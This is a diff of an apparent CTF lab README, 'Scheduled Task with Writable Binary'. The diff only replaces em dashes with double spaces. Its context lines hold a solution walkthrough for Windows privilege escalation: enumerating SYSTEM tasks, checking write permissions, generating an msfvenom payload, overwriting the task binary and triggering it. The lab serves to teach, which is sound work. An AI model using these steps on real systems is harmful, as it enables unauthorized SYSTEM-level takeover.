@@ -1,4 +1,4 @@
-# Challenge 2 — Scheduled Task with Writable Binary
+# Challenge 2  Scheduled Task with Writable Binary
 
 **Difficulty:** Medium
 **Category:** Windows Privilege Escalation
@@ -33,7 +33,7 @@ Set-ExecutionPolicy Bypass -Scope Process -Force
 Windows Task Scheduler allows tasks to run under any account, including SYSTEM.
 Unlike services (which restart automatically), scheduled tasks fire at predetermined
 times. If a task runs a binary that a low-privileged user can overwrite, replacing
-that binary is equivalent to replacing a service binary — except the trigger is time-based.
+that binary is equivalent to replacing a service binary  except the trigger is time-based.
 
 Enumeration tools to know: `schtasks`, `Get-ScheduledTask`, `accesschk.exe`.
 
@@ -83,9 +83,9 @@ Start-ScheduledTask -TaskName "SystemCleanup"
 ## Solution
 
 <details>
-<summary>Click to reveal — try on your own first!</summary>
+<summary>Click to reveal  try on your own first!</summary>
 
-### Step 1 — Enumerate scheduled tasks
+### Step 1  Enumerate scheduled tasks
 
 ```powershell
 Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "SYSTEM"} |
@@ -99,15 +99,15 @@ TaskName      Action
 SystemCleanup C:\Tasks\Cleanup\cleanup.exe
 ```
 
-### Step 2 — Confirm write permissions
+### Step 2  Confirm write permissions
 
 ```powershell
 icacls "C:\Tasks\Cleanup"
 ```
 
-Output includes: `ctfplayer:(W)` — we can write there.
+Output includes: `ctfplayer:(W)`  we can write there.
 
-### Step 3 — Generate and place the payload (on Kali)
+### Step 3  Generate and place the payload (on Kali)
 
 ```bash
 msfvenom -p windows/x64/exec \
@@ -121,13 +121,13 @@ Transfer to the VM and overwrite:
 Copy-Item cleanup.exe "C:\Tasks\Cleanup\cleanup.exe" -Force
 ```
 
-### Step 4 — Wait for the task or trigger it manually
+### Step 4  Wait for the task or trigger it manually
 
 ```powershell
 Start-ScheduledTask -TaskName "SystemCleanup"
 ```
 
-### Step 5 — Read the flag
+### Step 5  Read the flag
 
 ```powershell
 type C:\Users\Public\flag.txt
